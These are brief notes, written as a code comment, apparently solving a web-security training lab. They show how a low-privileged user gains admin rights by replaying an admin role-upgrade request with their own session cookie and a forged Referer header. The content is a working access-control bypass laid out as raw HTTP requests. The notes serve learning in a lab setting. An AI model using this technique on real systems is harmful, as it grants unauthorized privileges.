/*
1) login as administrator check the referrer for the change role functionality
    GET /admin-roles?username=carlos&action=upgrade HTTP/2
    Cookie: session=u6oyOw4bT1wdxRsnBh8fKxxCUHIxqP7B
    Referer: https://0aa7001004aa34b2804080c200c800f1.web-security-academy.net/admin

2) Logout from admin and login as wiener
    Cookie: session=4xOjWuN4DpiRkp2J8gw0RMiP3Qx2TQoU

3) cookie switch
    GET /admin-roles?username=wiener&action=upgrade HTTP/2
    Cookie: session=4xOjWuN4DpiRkp2J8gw0RMiP3Qx2TQoU
    Referer: https://0aa7001004aa34b2804080c200c800f1.web-security-academy.net/admin
    //302 FOUND 
*/